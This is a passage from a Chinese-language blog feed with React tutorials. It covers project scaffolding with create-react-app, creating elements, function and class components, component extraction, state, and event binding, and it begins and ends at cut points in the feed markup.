project-name</span><br></pre></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><ul><li>npx 安装，npm5.2+支持</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> project-name 项目名称</span></span><br><span class="line">npx create-react-app project-name</span><br></pre></td></tr></table></figure><p> <strong>推荐：</strong> 使用<strong>方式二</strong>这样每次使用的最新脚手架创建项目，创建完毕使用 <code>npm start</code> 启动项目。</p><h2 id="React-基本使用"><a href="#React-基本使用" class="headerlink" title="React 基本使用"></a>React 基本使用</h2><blockquote><p>在 create-react-app 脚手架创建项目中，掌握使用 react 基本步骤</p></blockquote><p>使用步骤：</p><ul><li>导入 <code>react</code>、<code>react-dom</code> 两个包</li><li>使用 <code>react</code> 创建 react 元素（虚拟 DOM）</li><li>使用 <code>react-dom</code> 渲染 react 元素</li></ul><p>落地代码：src 内文件删除，创建<code>src/index.js</code></p><ul><li>导包</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 负责创建react元素</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 负责把react元素渲染到页面</span></span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br></pre></td></tr></table></figure><ul><li>创建 react 元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数1：标签名称</span></span><br><span class="line"><span class="comment">// 参数2：属性集合  特殊 class==&gt;className for==&gt;htmlFor</span></span><br><span class="line"><span class="comment">// 参数3：标签内容</span></span><br><span class="line"><span class="keyword">const</span> element = React.createElement(<span class="string">'h1'</span>, &#123; <span class="attr">id</span>: <span class="string">'el'</span> &#125;, <span class="string">'Hello React'</span>);</span><br></pre></td></tr></table></figure><ul><li>渲染 react 元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #root在public/index.html上</span></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p> <strong>总结：</strong> 使用 <code>react</code> 创建元素，使用 <code>react-dom</code> 渲染元素。</p><h2 id="React-创建元素练习"><a href="#React-创建元素练习" class="headerlink" title="React 创建元素练习"></a>React 创建元素练习</h2><blockquote><p>掌握使用 react 创建嵌套元素</p></blockquote><p>使用 react 创建如下元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>水果<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>橘子<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>React代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> element = React.createElement(<span class="string">'div'</span>, &#123; <span class="attr">className</span>: <span class="string">'list'</span> &#125;, [</span><br><span class="line">  React.createElement(<span class="string">'h1'</span>, <span class="literal">null</span>, <span class="string">'水果'</span>),</span><br><span class="line">  React.createElement(<span class="string">'ul'</span>, <span class="literal">null</span>, [</span><br><span class="line">    React.createElement(<span class="string">'li'</span>, <span class="literal">null</span>, <span class="string">'苹果'</span>),</span><br><span class="line">    React.createElement(<span class="string">'li'</span>, <span class="literal">null</span>, <span class="string">'橘子'</span>),</span><br><span class="line">  ]),</span><br><span class="line">]);</span><br><span class="line"> </span><br><span class="line">ReactDOM.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p><strong>总结：</strong> 使用 <code>createElement</code> 创建元素非常麻烦、可读性差、不优雅，开发中推荐使用 JSX 来声明 UI。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;React介绍&quot;&gt;&lt;a href=&quot;#React介绍&quot; class=&quot;headerlink&quot; title=&quot;React介绍&quot;&gt;&lt;/a&gt;React介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;了解 react 的历史背景和基本概念&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React快速上手" scheme="//www.shen.ee/tags/React%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    
      <category term="React入门" scheme="//www.shen.ee/tags/React%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>React组件基础</title>
    <link href="//www.shen.ee/article/9550.html"/>
    <id>//www.shen.ee/article/9550.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="React-组件介绍"><a href="#React-组件介绍" class="headerlink" title="React 组件介绍"></a>React 组件介绍</h2><p>组件允许你将 UI 拆分为<strong>独立可复用</strong>的代码片段，并对每个片段进行独立构思。</p><p>组件表示页面中的部分功能，组合多个组件实现完整的页面。</p><p><strong>功能特点</strong>：可复用、独立、可组合。</p><h2 id="React组件的两种创建方式"><a href="#React组件的两种创建方式" class="headerlink" title="React组件的两种创建方式"></a>React组件的两种创建方式</h2><p><strong>React 创建组件方法：</strong></p><ol><li>使用函数 <strong><code>function</code></strong></li><li>使用类 <strong><code>class</code></strong></li></ol><h3 id="函数组件"><a href="#函数组件" class="headerlink" title="函数组件"></a>函数组件</h3><h4 id="1）什么是函数组件？"><a href="#1）什么是函数组件？" class="headerlink" title="1）什么是函数组件？"></a>1）什么是函数组件？</h4><ul><li>使用 JS 函数（普通，箭头）创建的组件。</li></ul><h4 id="2）定义函数组件"><a href="#2）定义函数组件" class="headerlink" title="2）定义函数组件"></a>2）定义函数组件</h4><ul><li>语法约定<ul><li>函数名称<code>首字母必需大写</code>，React 据此来区分组件和 HTML 元素。</li><li>函数<code>必须有返回值</code>，表示该组件的 UI 结构，如果不渲染任何内容可返回<code>null</code>。</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Header</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> Footer = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>底部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不渲染内容</span></span><br><span class="line"><span class="keyword">const</span> Loading = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> loading = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> loading ? <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> : <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="3）使用组件"><a href="#3）使用组件" class="headerlink" title="3）使用组件"></a>3）使用组件</h4><ul><li>函数的名称就是组件名称，使用组件就是把组件名称当标签使用即可。</li><li>组件标签可以是单标签也可以是双标签。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Header</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> Footer = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>底部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载组件，不渲染内容</span></span><br><span class="line"><span class="keyword">const</span> Loading = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> loading = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> loading ? <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>正在加载...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> : <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根组件</span></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;Header /&gt;</span><br><span class="line">      &lt;Loading /&gt;</span><br><span class="line">      &lt;Footer /&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>创建函数组件，首字母大写，需要返回值，不渲染就返回 <code>null</code>。</li><li>使用函数组件，组件名称当作标签使用即可。</li></ul><h3 id="类组件"><a href="#类组件" class="headerlink" title="类组件"></a>类组件</h3><h4 id="class-语法"><a href="#class-语法" class="headerlink" title="class 语法"></a>class 语法</h4><p>复习一下定义class、定义属性、定义函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动物</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  address = <span class="string">'地球'</span>;</span><br><span class="line">  eat() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'吃'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>extends</code> 继承父类</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 猫</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  run() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'跑'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> Cat();</span><br><span class="line">cat.run(); <span class="comment">// 跑</span></span><br><span class="line">cat.eat(); <span class="comment">// 吃</span></span><br><span class="line"><span class="built_in">console</span>.log(cat.address); <span class="comment">// 地球</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong> <code>class</code>创建类，<code>extends</code>继承类，可以使用父类的属性和函数。</p><h4 id="1）什么是类组件？"><a href="#1）什么是类组件？" class="headerlink" title="1）什么是类组件？"></a>1）什么是类组件？</h4><ul><li>使用<strong><code>class</code></strong>语法创建的组件就是类组件</li></ul><h4 id="2）定义类组件"><a href="#2）定义类组件" class="headerlink" title="2）定义类组件"></a>2）定义类组件</h4><ul><li>约定：类名首字母必需大写</li><li>约定：必须继承<strong><code>React.Component</code></strong>父类</li><li>约定：必需有<strong><code>render</code></strong>函数，返回 UI 结构，无渲染可返回 null</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3）使用类组件"><a href="#3）使用类组件" class="headerlink" title="3）使用类组件"></a>3）使用类组件</h4><ul><li>类名称就是组件名称，使用组件就是把组件名称当标签使用即可。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 头部</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 根组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;Header /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul><li>使用<strong><code>class</code></strong>定义类，使用<strong><code>extends</code></strong>继承<strong><code>React.Component</code></strong>完成类组件定义</li><li>类名<code>首字母大写</code>，必须有<code>render</code>函数返回 UI 结构，无渲染可返回<code>null</code></li><li>使用的时候把类名当作<code>标签</code>使用即可</li></ul><h2 id="组件抽离"><a href="#组件抽离" class="headerlink" title="组件抽离"></a>组件抽离</h2><p>如果所有组件写在一个文件，代码写在一起后续会难以维护，组件作为一个独立的个体，一般都会放到一个单独的JS文件中。</p><p><strong>抽离组件</strong> </p><ul><li>定义一个<code>js</code>或者<code>jsx</code>文件定义组件默认导出</li><li>使用组件导入即可，当作标签使用。</li></ul><p><strong>具体操作：</strong> </p><p> 1.新建 <strong><code>src/components/Header.jsx</code></strong> 类组件，新建 <strong><code>src/components/Footer.jsx</code></strong> 函数组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>头部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Header;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Footer = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>底部组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Footer;</span><br></pre></td></tr></table></figure><p>2.新建 <strong><code>src/App.jsx</code></strong> 组件, 导入<strong><code>Header</code> <code>Footer</code></strong>组件使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> Header <span class="keyword">from</span> <span class="string">'./components/Header.jsx'</span>;</span><br><span class="line"><span class="keyword">import</span> Footer <span class="keyword">from</span> <span class="string">'./components/Footer.jsx'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;Header /&gt;</span><br><span class="line">        内容</span><br><span class="line">        &lt;Footer /&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>3.<strong><code>index.js</code></strong> 使用 <strong><code>App</code></strong> 根组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.jsx'</span>;</span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span>, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><h2 id="无状态组件和有状态组件"><a href="#无状态组件和有状态组件" class="headerlink" title="无状态组件和有状态组件"></a>无状态组件和有状态组件</h2><blockquote><p>简单理解：</p><p>无状态(函数)组件，负责静态结构展示</p><p>有状态(类）组件，负责更新UI，让页面动起来</p></blockquote><h3 id="1-无状态组件"><a href="#1-无状态组件" class="headerlink" title="1.无状态组件"></a>1.无状态组件</h3><ul><li>组件本身不定义状态，没有组件生命周期，只负责 UI 渲染。</li><li><code>React16.8</code>之前的函数组件都是无状态组件，<code>Hooks</code> 出现后函数组件也可以有状态。</li></ul><h3 id="2-有状态组件"><a href="#2-有状态组件" class="headerlink" title="2.有状态组件"></a>2.有状态组件</h3><ul><li>组件本身有独立数据，拥有组件生命周期，存在交互行为。</li><li><code>class</code> 组件可以定义组件自己的状态，拥有组件生命周期，它是有状态组件。</li></ul><h3 id="3-它们的区别"><a href="#3-它们的区别" class="headerlink" title="3.它们的区别"></a>3.它们的区别</h3><ul><li>无状态组件由于没有维护状态只做渲染，性能较好。有状态组件提供数据和生命周期，能力更强。</li></ul><h3 id="4-如何去选择"><a href="#4-如何去选择" class="headerlink" title="4.如何去选择"></a>4.如何去选择</h3><ul><li><code>React16.8</code>之前，组件不需要维护数据只渲染就使用<code>函数组件</code>，有数据和交互使用<code>类组件</code>。你需要去判断，有心智负担。</li><li><code>React16.8</code>之后，<code>Hooks</code>出现给函数提供状态，建议使用函数组件即可。</li></ul><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul><li>组件本身没有状态就是无状态组件，组件本身提供状态就是有状态组件。</li><li>16.8 之前，无状态组件使用函数组件，有状态组件使用类组件。16.8 之后，统一可使用函数组件。</li><li>React 没有说完全取代类组件，老项目中还是类组件居多，我们有必要学习下它的具体用法。</li></ul><h2 id="类组件-定义状态"><a href="#类组件-定义状态" class="headerlink" title="类组件 - 定义状态"></a>类组件 - 定义状态</h2><ul><li>定义<strong><code>state</code></strong>属性定义组件状态，属于组件自己的数据，它的值是个对象。</li><li>使用<strong><code>state</code></strong>的时候通过<strong><code>this</code></strong>去访问即可，例如：<strong><code>this.state.xxx</code>。</strong></li><li>数据发生变化，驱动视图更新。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    title: <span class="string">'数码产品'</span>,</span><br><span class="line">    list: [<span class="string">'电脑'</span>, <span class="string">'手机'</span>, <span class="string">'相机'</span>],</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;h3&gt;&#123;<span class="keyword">this</span>.state.title&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">          &#123;this.state.list.map((item) =&gt; &#123;</span></span><br><span class="line"><span class="regexp">            return &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;/</span>li&gt;;</span><br><span class="line">          &#125;)&#125;</span><br><span class="line">        &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>定义<strong><code>state</code></strong>属性，值是对象存储数据，<strong><code>this.state.xxx</code></strong>使用数据，数据驱动视图更新。</li></ul><h2 id="类组件-绑定事件"><a href="#类组件-绑定事件" class="headerlink" title="类组件 - 绑定事件"></a>类组件 - 绑定事件</h2><ul><li>在类中声明事件处理函数，在标签上使用<code>on+事件名称={处理函数}</code>的方式绑定事件，事件名称需要遵循<code>大驼峰</code>规则。</li><li>处理函数默认的参数就是事件对象，可以使用事件对象处理默认行为和事件冒泡。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="comment">// 默认行为</span></span><br><span class="line">    e.preventDefault();</span><br><span class="line">    <span class="comment">// 事件冒泡</span></span><br><span class="line">    e.stopPropagation();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'handleClick'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  handleMouseEnter() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'handleMouseEnter'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div onMouseEnter=&#123;<span class="keyword">this</span>.handleMouseEnter&#125;&gt;</span><br><span class="line">          计数器：&#123;<span 